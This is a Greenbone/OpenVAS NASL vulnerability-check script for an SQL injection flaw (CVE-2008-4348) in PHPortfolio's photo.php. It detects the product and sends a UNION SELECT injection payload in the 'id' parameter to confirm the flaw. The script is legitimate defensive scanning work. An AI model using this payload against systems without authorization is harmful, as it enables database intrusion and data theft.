# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902521");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_cve_id("CVE-2008-4348");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PHPortfolio 'photo.php' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/45078");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/31143");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17316/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL Injection
  attack and gain sensitive information.");

  script_tag(name:"affected", value:"PHPortfolio version 1.3 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the 'id' parameter in photo.php, which allows attacker to manipulate SQL
  queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"PHPortfolio is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)) {
  exit(0);
}

vt_strings = get_vt_strings();

foreach dir (make_list_unique("/phportfolio", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:dir + "/index.php",  port:port);

  if(egrep(pattern:"Powered by.*>PHPortfolio<", string:res))
  {
    url = string(dir, "/photo.php?id=48+and+1=2+union+select+1,version(),",
                 "user(),database(),0x",vt_strings["default_hex"],"6--");

    if(http_vuln_check(port:port, url:url, pattern:'>' + vt_strings["default"] + '<',
       extra_check: make_list('>film:<', '>lens:<', '>location:<')))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
